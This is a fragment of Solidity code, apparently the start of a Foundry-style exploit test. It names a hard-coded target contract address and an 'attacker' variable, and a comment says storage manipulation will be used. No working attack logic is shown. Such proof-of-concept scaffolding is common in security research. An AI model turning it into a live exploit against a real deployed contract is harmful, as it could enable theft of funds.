    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use storage manipulation in the exploit
    }

